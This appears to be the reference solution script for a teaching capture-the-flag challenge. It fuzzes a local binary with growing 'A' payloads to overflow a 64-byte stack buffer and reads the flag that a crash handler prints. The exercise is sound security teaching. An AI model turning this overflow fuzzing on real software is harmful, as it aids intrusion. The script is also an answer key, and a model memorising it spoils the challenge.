#!/usr/bin/env python3
"""
solve.py — reference solution for Mutation Station CTF (CAPEC-28).

Strategy:
  1. Keep the 10-byte envelope valid (magic + honest length field).
  2. Fuzz payload size upward from 1 byte.
  3. The internal buffer is 64 bytes; anything significantly larger
     corrupts the saved return address and crashes on function return.
  4. The SIGSEGV handler prints the flag — so we harvest stdout.

Runs in well under a second.
"""

import os
import subprocess
import sys

MAGIC = b"FUZZME\x00\x01"
BINARY = "./station"
INPUT_FILE = "solve_input.bin"


def build_record(payload: bytes) -> bytes:
    """Valid envelope, honest length, arbitrary payload."""
    return MAGIC + len(payload).to_bytes(2, "little") + payload


def try_payload(payload: bytes):
    with open(INPUT_FILE, "wb") as f:
        f.write(build_record(payload))
    return subprocess.run(
        [BINARY, INPUT_FILE],
        capture_output=True,
        timeout=3,
    )


def main():
    # The vulnerable buffer is 64 bytes. Start just above and grow.
    for size in range(64, 513):
        r = try_payload(b"A" * size)
        if b"itc266{" in r.stdout:
            flag = r.stdout.decode(errors="replace").strip()
            print(f"[+] Crashed with payload size {size}")
            print(f"[+] FLAG: {flag}")
            os.remove(INPUT_FILE)
            return 0

    print("[-] No flag recovered. Is the binary compiled and in the CWD?")
    return 1


if __name__ == "__main__":
    sys.exit(main())
